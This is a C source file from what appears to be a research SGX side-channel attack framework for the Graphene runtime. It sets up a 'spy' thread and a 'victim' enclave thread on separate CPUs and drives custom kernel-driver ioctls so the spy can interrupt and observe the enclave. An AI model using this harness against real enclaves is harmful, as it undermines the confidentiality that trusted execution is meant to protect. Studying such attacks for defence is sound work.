#define _GNU_SOURCE

#include <sched.h>
#include <pthread.h>

#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include "../../pal.h"

#include "sgx_attacker.h"
#include "sgx-driver/graphene-sgx.h"

int printf(const char * fmt, ...);

/* ===================== ATTACK CONFIGURATION  ===================== */
#define ENCLAVE_CPU_NB          0
#define SPY_CPU_NB              1
#define SYSDUMP_CONTROL_SPY     0

/* ===================== SPY/VICTIM THREAD CREATION  ===================== */

extern int gsgx_device;
int ioctl_rv;
void *dummy_pt = NULL;

#define IOCTL_ASSERT(f, arg) \
	if ( ( ioctl_rv = ioctl( gsgx_device, f, arg ) ) != 0 ) \
	{ \
		printf( "\t--> ioctl " #f " failed (error %i)\n", ioctl_rv ); \
		abort(); \
	}

void claim_cpu(char *me, int nb)
{
    cpu_set_t cpuset; 
    CPU_ZERO(&cpuset);
    CPU_SET(nb , &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    printf("%s: continuing on CPU %d\n", me, sched_getcpu());
}

volatile int spy_created = 0;
pthread_t pth_spy;

extern void async_exit_pointer (void);

void *thrSpy(void *arg)
{
    claim_cpu("spy", SPY_CPU_NB);   
    
    IOCTL_ASSERT(GSGX_IOCTL_SPY_INIT, &dummy_pt);
    /*
     * Spy thread continues in kernel mode.
     */
    struct gsgx_spy_info spy_info;
    spy_info.ipi_cpu_nb = ENCLAVE_CPU_NB;
    spy_info.cur_tcs = (uint64_t) arg;
    spy_info.aep = (uint64_t) async_exit_pointer; 
   
    spy_created = 1;
    IOCTL_ASSERT(GSGX_IOCTL_SPY_START, &spy_info);
    
    return NULL;
}

extern __thread void * current_tcs;

void start_spy_thread(void)
{
    printf("\n------------\nvictim:hi from start_spy_thread!\n");
    printf("victim: cur_tcs is %p\n", current_tcs);

    printf("victim: creating spy thread..\n");
    pthread_create(&pth_spy, NULL, thrSpy, current_tcs);

    claim_cpu("victim", ENCLAVE_CPU_NB);
    
    /*
     * Wait until spy thread is created and ready in kernel mode; victim thread
     * continues to run through enclave, and will eventually call
     * stop_spy_thread().
     */
    while(!spy_created);
    IOCTL_ASSERT(GSGX_IOCTL_SPY_WAIT, &dummy_pt);
    
    printf("----------\n\n");
}

void stop_spy_thread(void)
{
    printf("\n-----------\nvictim: hi from stop_spy_thread on CPU %d\n",
        sched_getcpu());

    IOCTL_ASSERT(GSGX_IOCTL_SPY_STOP, &dummy_pt);

    printf("victim: waiting for completion spy thread..\n");
    pthread_join(pth_spy, &dummy_pt);
    
    printf("victim: all done!\n------------\n\n");
}

/*
 * Called from untrusted Graphene runtime, after enclave creation.
 */
void sgx_enter_victim(void)
{
#if SYSDUMP_CONTROL_SPY
    printf("sgx_enter_victim: waiting to start spy thread after sysdump...\n");
#else
    start_spy_thread();
#endif
}

/*
 * Called from untrusted Graphene runtime, on custom sysdump ocall.
 */
void sgx_sysdump_victim( int arg )
{
#if SYSDUMP_CONTROL_SPY
    if (!arg)
    {
        start_spy_thread();
    }
    else if (arg == 0x1)
    {
        stop_spy_thread();
    }
#endif
}

/*
 * Called from untrusted Graphene runtime, upon exit syscall.
 */
void sgx_exit_victim(void)
{
#if SYSDUMP_CONTROL_SPY
    printf("sgx_exit_victim: spy thread should be stopped by now...\n");
#else
    stop_spy_thread();
#endif
}
